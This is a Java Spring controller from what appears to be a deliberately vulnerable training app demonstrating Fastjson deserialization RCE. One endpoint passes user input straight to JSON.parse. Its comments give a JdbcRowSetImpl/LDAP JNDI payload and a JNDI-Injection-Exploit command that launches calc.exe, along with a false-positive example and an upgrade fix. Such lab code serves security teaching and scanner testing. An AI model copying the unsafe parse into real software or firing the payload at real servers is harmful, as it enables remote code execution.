package com.example.vulnerablejava.controller;

import java.util.Map;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.example.vulnerablejava.entity.Image;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;

@Api(tags = "Fastjson RCE 漏洞")
@RestController
@RequestMapping("fastjson")
public class FastjsonController {

    /**
     * 存在Fastjson RCE漏洞，攻击者发送如下数据，即可执行命令
     * {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/1dus4n","autoCommit":true}
     *
     * 开启ldap server: java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C
     * "calc.exe" -A "127.0.0.1"
     *
     * 使用dnslog验证:
     * {"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.com"}}
     */
    @ApiOperation("存在漏洞")
    @GetMapping("1")
    public String read(String json) {
        Object parse = JSON.parse(json);
        return parse.toString();
    }

    /**
     * 误报案例, 先序列化，再反序列化，不可利用
     */
    @ApiOperation("误报案例, 先序列化再反序列化")
    @GetMapping("2")
    public String read2(Image image) {
        image.setUrl("http://www.example.com/");
        Map<String, Object> params = JSONObject.parseObject(JSONObject.toJSONString(image));
        return params.toString();
    }

    /**
     * 修复漏洞，升级fastjson到最新版本
     */
}
